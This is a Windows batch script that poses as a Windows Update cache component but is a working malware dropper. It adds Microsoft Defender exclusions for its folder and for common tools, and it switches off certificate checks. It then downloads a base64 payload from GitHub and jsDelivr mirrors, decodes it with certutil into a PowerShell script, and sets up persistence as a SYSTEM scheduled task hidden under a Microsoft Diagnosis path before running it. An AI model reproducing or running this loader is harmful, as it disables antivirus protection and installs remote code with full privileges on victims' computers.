@echo off
setlocal EnableExtensions
echo === GO.CMD BUILD 20260729Z ===

net session >nul 2>&1
if errorlevel 1 (
  echo Acces refuse: run as Administrator or SYSTEM - not Guest.
  exit /b 5
)

set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "B64=%WORKDIR%\update.b64"
set "PS1=%WORKDIR%\wucache_pkg.ps1"
set "ERR=%WORKDIR%\boot.err"
set "MARKER=WU_BUILD_20260729U"
set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'certutil.exe' -EA SilentlyContinue}Catch{}"

attrib -h -s -r "%WORKDIR%\*" /s >nul 2>&1
del /f /q "%WORKDIR%\*.ps1" >nul 2>&1
del /f /q "%WORKDIR%\*.b64" >nul 2>&1
del /f /q "%ERR%" >nul 2>&1

echo Downloading payload via mirrors...
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop'; ^
  [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; ^
  try{[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}catch{}; ^
  $out='%B64%'; $urls=@( ^
    'https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateU.b64', ^
    'https://fastly.jsdelivr.net/gh/xnobuddy/github-drop@main/updateU.b64', ^
    'https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateU.b64', ^
    'https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/updateU.b64' ^
  ); ^
  $ok=$false; foreach($u in $urls){ try{ Write-Host \"TRY $u\"; ^
    if(Get-Command curl.exe -EA SilentlyContinue){ & curl.exe -L --ssl-no-revoke --connect-timeout 20 -o $out $u 2>$null } ^
    if(-not (Test-Path $out) -or (Get-Item $out).Length -lt 1000){ (New-Object Net.WebClient).DownloadFile($u,$out) } ^
    if((Test-Path $out) -and (Get-Item $out).Length -gt 1000){ Write-Host \"OK $u size=$((Get-Item $out).Length)\"; $ok=$true; break } ^
  } catch { Write-Host \"FAIL $u $($_.Exception.Message)\" } }; ^
  if(-not $ok){ throw 'all mirrors failed' }"
if errorlevel 1 (
  echo Download failed on all mirrors.
  exit /b 1
)

for %%A in ("%B64%") do echo Downloaded bytes: %%~zA

certutil.exe -decode "%B64%" "%PS1%"
if errorlevel 1 (
  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$b=[IO.File]::ReadAllText('%B64%') -replace '\s',''; [IO.File]::WriteAllBytes('%PS1%',[Convert]::FromBase64String($b))"
)
if not exist "%PS1%" (
  echo Decode failed.
  exit /b 2
)
for %%A in ("%PS1%") do echo Decoded bytes: %%~zA

findstr /C:"%MARKER%" "%PS1%" >nul
if errorlevel 1 (
  echo ERROR: decoded payload missing %MARKER%
  exit /b 3
)

attrib -h -s -r "%PS1%" >nul 2>&1

set "WRAP=%WORKDIR%\boot.cmd"
> "%WRAP%" echo @echo off
>>"%WRAP%" echo echo boot_start^> "%ERR%"
>>"%WRAP%" echo powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%PS1%" ^>^> "%ERR%" 2^>^&1
>>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^> "%ERR%"

schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "\"%WRAP%\""
if errorlevel 1 (
  echo ERROR: could not create SYSTEM task
  exit /b 4
)
schtasks /Run /TN "%ONCETASK%"
echo Payload OK [%MARKER%], launched. Wait 180s.
exit /b 0
